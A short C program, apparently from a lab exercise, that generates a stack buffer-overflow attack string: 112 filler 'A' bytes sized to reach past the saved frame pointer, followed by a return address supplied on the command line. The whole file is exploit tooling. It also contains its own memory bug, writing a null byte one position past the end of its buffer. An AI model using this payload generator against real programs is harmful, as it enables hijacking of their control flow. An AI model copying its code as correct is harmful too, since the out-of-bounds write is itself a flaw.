#include <stdio.h>

int main(int argc,  char* argv[]){
	
	int bufferLength = 112; // buffer allocation length + ebp length
	char buffer[bufferLength];
	char* input[4];
	int i;
	for(i=0;i< bufferLength;i++){
		buffer[i] = 'A'; //use any random char to fill buffer
	}
	buffer[bufferLength] = '\0'; //end the char array with null char because it may cause bugs otherwise
	printf("%s",buffer); //fill buffer
	*input=argv[1]; //get adress from command line
	printf("%s",*input); //add adress to the attack string to overwrite return adress

	return 0;	
}

